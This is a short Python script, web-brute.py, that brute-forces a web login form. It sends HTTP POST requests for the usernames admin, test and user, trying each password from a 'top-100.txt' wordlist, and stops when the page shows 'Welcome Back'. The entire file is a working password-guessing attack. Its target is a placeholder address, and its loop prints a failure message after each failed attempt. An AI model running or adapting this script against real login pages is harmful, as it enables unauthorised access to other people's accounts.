#web-brute.py

import requests
import sys
target = 'http://120.0.0.1:5000' # i dont have web app now

usernames = ["admin","test","user"]
passwords = 'top-100.txt'

needle = "Welcome Back"  #success msg on web

for username in usernames:
	with open(passwords,"r") as passwords_lists:
		for password in passwords_lists:
			password = password.strip("\n").encode()
			sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username,password.decode()))
			sys.stdout.flush()
			r = requests.post(target,data={"username":username,"password":password})
			if needle.encode() in r.content:
				sys.stdout.write("\n")
				sys.stdout.write("\t[>>>>>] Valid Passowrd '{}' found for user '{}'".format(password.decode(),username))
				sys.exit()

			sys.stdout.flush()
			sys.stdout.write("\n")
			sys.stdout.write("\t No Passoword found for '{}'!".format(username))
